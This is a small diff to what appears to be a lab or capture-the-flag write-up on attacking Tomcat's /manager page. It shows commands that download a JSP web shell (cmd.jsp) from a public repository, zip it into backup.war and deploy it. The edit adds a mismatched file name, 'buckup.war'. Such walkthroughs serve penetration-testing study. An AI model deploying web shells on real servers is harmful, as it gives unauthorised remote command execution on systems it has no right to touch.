@@ -36,4 +36,4 @@ on /manager tab is deploy section when we can upload file which we can get from 
 wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
 zip -r backup.war cmd.jsp
 ````
-and click deploy
+and click deploy (buckup.war)
